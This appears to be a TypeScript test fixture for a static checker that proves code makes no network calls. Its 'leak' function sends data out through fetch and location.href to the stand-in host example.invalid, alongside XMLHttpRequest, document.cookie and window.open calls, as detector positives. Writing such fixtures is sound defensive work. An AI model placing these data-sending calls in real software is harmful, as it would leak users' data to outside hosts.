/**
 * A file the offline proof is tried on: it has every way out the proof looks for once, and talks about them in comments and strings, which are not findings.
 * "fetch(" and XMLHttpRequest in this comment are text. Nothing imports this file but the proof's own test.
 */
import clsx from "clsx";
import type { ReactNode } from "react";

const text = "we never call fetch( or new XMLHttpRequest() or navigator.sendBeacon here";
const replaced = text.replace("never", "do not");

export function leak(data: string): void {
  void fetch("https://example.invalid/", { body: data });
  const request = new XMLHttpRequest();
  document.cookie = data;
  window.open("https://example.invalid/");
  location.href = `https://example.invalid/?${data}`;
  const anchor = document.createElement("a");
  anchor.href = "blob:x";
  void [clsx, replaced, request, anchor];
}

export type { ReactNode };
